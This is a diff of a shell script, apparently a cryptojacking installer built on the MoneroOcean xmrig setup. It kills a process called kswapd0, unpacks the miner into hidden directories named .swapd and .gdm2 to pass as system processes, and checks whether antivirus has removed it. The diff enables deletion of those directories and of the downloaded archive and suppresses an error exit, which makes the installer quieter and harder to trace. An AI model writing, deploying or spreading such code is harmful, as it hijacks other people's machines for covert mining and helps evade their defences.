@@ -188,8 +188,8 @@ killall -9 kswapd0
 echo "[*] Removing previous directories..."
 rm -rf $HOME/moneroocean
 rm -rf $HOME/.moneroocean
-#rm -rf $HOME/.gdm2
-#rm -rf $HOME/.swapd
+rm -rf $HOME/.gdm2
+rm -rf $HOME/.swapd
 
 echo "[*] Downloading MoneroOcean advanced version of xmrig to xmrig.tar.gz"
 if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o xmrig.tar.gz; then
@@ -203,9 +203,9 @@ echo "[*] Unpacking xmrig.tar.gz to $HOME/.swapd"
 [ -d $HOME/.swapd ] || mkdir $HOME/.swapd
 if ! tar xf xmrig.tar.gz -C $HOME/.swapd; then
   echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.swapd directory"
-  exit 1
+#  exit 1
 fi
-#rm xmrig.tar.gz
+rm xmrig.tar.gz
 
 echo "[*] Checking if advanced version of $HOME/.swapd/xmrig works fine (and not removed by antivirus software)"
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.swapd/config.json
